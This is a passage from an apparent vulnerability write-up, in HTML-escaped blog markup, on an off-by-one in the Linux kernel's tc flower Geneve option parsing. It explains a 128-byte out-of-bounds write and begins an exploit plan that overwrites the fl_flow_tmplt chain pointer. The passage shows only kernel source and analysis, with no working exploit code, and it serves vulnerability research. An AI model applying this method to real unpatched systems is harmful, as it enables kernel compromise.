class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tnla_opt_msk \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_next\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_msk, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#FFAB70\">msk_depth\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We observe that the higher-level function of \u003Ccode>fl_set_geneve_opt\u003C/code> is \u003Ccode>fl_set_enc_opt\u003C/code>. \u003Ccode>fl_set_enc_opt\u003C/code> is responsible for determining the possibility of passing in multiple data packets. Therefore, it iterates internally to parse each packet of \u003Ccode>TCA_FLOWER_KEY_ENC_OPTS_GENEVE\u003C/code> type. These packets are categorized into key and mask types, with the requirement that there must be a key before a mask, and the lengths of the key and mask must be equal (checked at position [10]). The \u003Ccode>enc_opts.len\u003C/code> we are concerned with represents the cumulative length of the data packets already passed in.\u003C/p>\n\u003Cp>So far, it appears there isnt an issue because even if theres an array overflow at position [1], the lengths of \u003Ccode>key->enc_opts.len\u003C/code> and the subsequent data packets will be checked, and the process will fail due to failed validation.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/meme2.png&#x22;,&#x22;alt&#x22;:&#x22;meme2&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>However, lets take a closer look at the structure containing this potentially overflowing array.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_dissector_key_enc_opts {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8 \u003C/span>\u003Cspan style=\"color:#FFAB70\">data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[FLOW_DIS_TUN_OPTS_MAX];\u003C/span>\u003Cspan style=\"color:#6A737D\">\t/* Using IP_TUNNEL_OPTS_MAX is desired\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t\t\t\t\t * here but seems difficult to #include\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t\t\t\t\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8 len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t__be16 dst_opt_type;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The \u003Ccode>data\u003C/code> array is of length 255, followed immediately by \u003Ccode>len\u003C/code>, which is of type \u003Ccode>u8\u003C/code>, occupying just one byte with a maximum value of 255. However, the issue arises here. Suppose we pass in two or more data packets with a cumulative total size of 252. Due to the initialization of a 4-byte \u003Ccode>struct geneve_opt\u003C/code> header directly at position [1], an off-by-one error occurs. Fortunately, this off-by-one error precisely overwrites the \u003Ccode>len\u003C/code> field of the \u003Ccode>flow_dissector_key_enc_opts\u003C/code> structure. Thus, relying on this off-by-one error, we can access position \u003Ccode>key->enc_opts.data[252]\u003C/code>. However, \u003Ccode>key->enc_opts.len\u003C/code> is overwritten with a value less than 128 (calculated as 4 + package length/4 + package length). This means \u003Ccode>key->enc_opts.len = opt->length = data_len / 4\u003C/code>. Consequently, we can bypass the checks at positions [4], [5], and [6], resulting in an out-of-bounds write of up to 128 bytes.\u003C/p>\n\u003Ch2 id=\"0x02-exploit\">0x02 Exploit\u003C/h2>\n\u003Cp>Now that we have a maximum of 128 bytes for the out-of-bounds write, since the overflow occurs in a nested structure, lets first trace the function call chain of \u003Ccode>fl_set_geneve_opt\u003C/code>.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/1.png&#x22;,&#x22;alt&#x22;:&#x22;1&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>As shown in the above diagram, the top-level functions are \u003Ccode>tc_new_tfilter\u003C/code> and \u003Ccode>tc_ctl_chain\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> __init \u003C/span>\u003Cspan style=\"color:#B392F0\">tc_filter_init\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\ttc_filter_wq \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> alloc_ordered_workqueue\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"tc_filter_workqueue\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">tc_filter_wq)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ENOMEM;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> register_pernet_subsys\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">tcf_net_ops);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err_register_pernet_subsys;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\trtnl_register\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t      RTNL_FLAG_DOIT_UNLOCKED);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\trtnl_register\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t      RTNL_FLAG_DOIT_UNLOCKED);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\trtnl_register\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\trtnl_register\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\trtnl_register\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\trtnl_register\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t      tc_dump_chain, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">err_register_pernet_subsys:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tdestroy_workqueue\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(tc_filter_wq);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Here, \u003Ccode>tc_new_tfilter\u003C/code> and \u003Ccode>tc_ctl_chain\u003C/code> are respectively called when the user passes in types such as RTM_NEWTFILTER and RTM_NEWCHAIN via Netlink.\u003C/p>\n\u003Cp>The intermediate layers virtual functions are located in \u003Ccode>cls_fl_ops\u003C/code>. Positions [11] and [12] are where we can trigger the vulnerable function.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_proto_ops cls_fl_ops __read_mostly \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.kind\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"flower\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.classify\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_classify,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.init\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_init,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.destroy\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_destroy,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.get\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_get,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.put\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_put,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.change\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_change,\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">11\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.delete\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_delete,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.delete_empty\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_delete_empty,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.walk\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_walk,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.reoffload\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_reoffload,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.hw_add\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_hw_add,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.hw_del\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_hw_del,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.dump\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_dump,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.terse_dump\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_terse_dump,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.bind_class\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_bind_class,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.tmplt_create\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_tmplt_create,\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">12\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.tmplt_destroy\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_tmplt_destroy,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.tmplt_dump\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_tmplt_dump,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.owner\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> THIS_MODULE,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.flags\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TCF_PROTO_OPS_DOIT_UNLOCKED,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Once weve identified the call chain, we can follow these two chains to find the objects we can overflow. The two directly overflowable objects are as follows:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_tmplt {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key dummy_key;      \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">13\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key mask;\t\t   \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">14\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_dissector dissector;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_chain \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">chain;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> cls_fl_filter {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_mask \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">mask;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhash_head ht_node;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key mkey;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_exts exts;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_result res;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key key;\t\t\t\t \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">15\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head list;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head hw_list;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 handle;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 flags;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 in_hw_count;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rcu_work rwork;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> net_device \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">hw_dev;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* Flower classifier is unlocked, which means that its reference counter\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * can be changed concurrently without any kind of external\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * synchronization. Use atomic reference counter to be concurrency-safe.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\trefcount_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> refcnt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tbool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> deleted;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We focus on the \u003Ccode>fl_flow_tmplt\u003C/code> structure. Since we can overflow 128 bytes and overwrite the object pointer of \u003Ccode>chain\u003C/code>, modifying \u003Ccode>chain\u003C/code> allows us to perform interesting fabrications when \u003Ccode>fl_flow_tmplt\u003C/code> calls this object. Additionally, we find that the \u003Ccode>cls_fl_ops\u003C/code> virtual functions include a \u003Ccode>fl_tmplt_destroy\u003C/code> function.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> void\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_tmplt_destroy\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">tmplt_priv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_tmplt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">tmplt \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tmplt_priv;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tfl_hw_destroy_tmplt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(tmplt->chain, tmplt);\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tkfree\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(tmplt);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> void\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_hw_destroy_tmplt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_chain \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">chain\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_tmplt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">tmplt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_cls_offload cls_flower \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_block \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> chain->block;\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">17\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tcls_flower.common.chain_index \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> chain->index;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tcls_flower.command \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> FLOW_CLS_TMPLT_DESTROY;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tcls_flower.cookie \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> 